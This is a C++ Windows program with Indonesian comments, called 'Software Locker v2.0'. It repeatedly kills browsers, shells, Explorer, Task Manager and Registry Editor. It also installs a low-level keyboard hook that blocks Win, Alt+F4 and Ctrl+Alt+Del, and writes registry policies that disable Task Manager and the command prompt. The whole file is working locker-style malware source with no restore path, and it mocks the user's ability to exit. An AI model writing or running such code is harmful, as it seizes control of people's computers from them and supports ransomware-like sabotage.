// SoftwareLocker.cpp - C++ untuk kunci software dan keyboard
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <vector>

using namespace std;

// Daftar aplikasi yang akan di-kill
vector<string> appsToKill = {
    "chrome.exe", "firefox.exe", "msedge.exe", "opera.exe",
    "notepad.exe", "wordpad.exe", "mspaint.exe", "calc.exe",
    "cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe",
    "explorer.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe",
    "control.exe", "mmc.exe"
};

// Fungsi untuk kill aplikasi
void KillApplications() {
    cout << "🔪 KILLING APPLICATIONS..." << endl;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        cout << "❌ Gagal mengambil snapshot proses" << endl;
        return;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            string processName = pe32.szExeFile;
            
            // Cek apakah proses dalam daftar kill
            for (const auto& app : appsToKill) {
                if (processName == app) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess != NULL) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        cout << "✅ Killed: " << processName << endl;
                    }
                    break;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
}

// Hook untuk keyboard
HHOOK keyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        
        // Block keyboard shortcuts
        bool isCtrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool isAlt = GetAsyncKeyState(VK_MENU) & 0x8000;
        bool isShift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool isWin = GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000;
        
        // Block: Windows+D, Alt+F4, Ctrl+Alt+Del, Windows+E, Windows+R, etc.
        if ((isWin && (pKey->vkCode == 'D' || pKey->vkCode == 'E' || pKey->vkCode == 'R')) ||
            (isAlt && pKey->vkCode == VK_F4) ||
            (isCtrl && isAlt && pKey->vkCode == VK_DELETE) ||
            (isCtrl && isShift && pKey->vkCode == VK_ESCAPE) ||
            pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
            
            cout << "🔒 BLOCKED: ";
            if (isWin) cout << "WIN+";
            if (isCtrl) cout << "CTRL+";
            if (isAlt) cout << "ALT+";
            if (isShift) cout << "SHIFT+";
            cout << char(pKey->vkCode) << endl;
            
            return 1; // Block the key
        }
    }
    
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Fungsi untuk disable Task Manager
void DisableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        cout << "✅ Task Manager disabled" << endl;
    }
}

// Fungsi untuk disable CMD dan PowerShell
void DisableCommandPrompts() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
        "Software\\Policies\\Microsoft\\Windows\\System", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        cout << "✅ CMD disabled" << endl;
    }
}

// Fungsi utama
int main() {
    cout << "🔐 SOFTWARE LOCKER v2.0" << endl;
    cout << "========================" << endl;
    cout << "Fitur:" << endl;
    cout << "1. Kill semua aplikasi" << endl;
    cout << "2. Block keyboard shortcuts:" << endl;
    cout << "   - Windows+D (Desktop)" << endl;
    cout << "   - Alt+F4 (Close)" << endl;
    cout << "   - Ctrl+Alt+Del (Task Manager)" << endl;
    cout << "   - Windows+E (Explorer)" << endl;
    cout << "   - Windows+R (Run)" << endl;
    cout << "   - Windows key sendiri" << endl;
    cout << "3. Disable Task Manager" << endl;
    cout << "4. Disable CMD/PowerShell" << endl;
    cout << "5. Block new process creation" << endl;
    
    // Jalankan semua fungsi
    KillApplications();
    DisableTaskManager();
    DisableCommandPrompts();
    
    // Install keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        cout << "❌ Gagal install keyboard hook" << endl;
    } else {
        cout << "✅ Keyboard hook installed" << endl;
    }
    
    // Loop utama untuk menjaga program tetap berjalan
    cout << endl << "🔒 SOFTWARE TERKUNCI - Press Ctrl+C to exit (jika bisa)" << endl;
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Kill aplikasi baru setiap 5 detik
        static DWORD lastKill = GetTickCount();
        if (GetTickCount() - lastKill > 5000) {
            KillApplications();
            lastKill = GetTickCount();
        }
    }
    
    // Cleanup
    if (keyboardHook != NULL) {
        UnhookWindowsHookEx(keyboardHook);
    }
    
    return 0;
}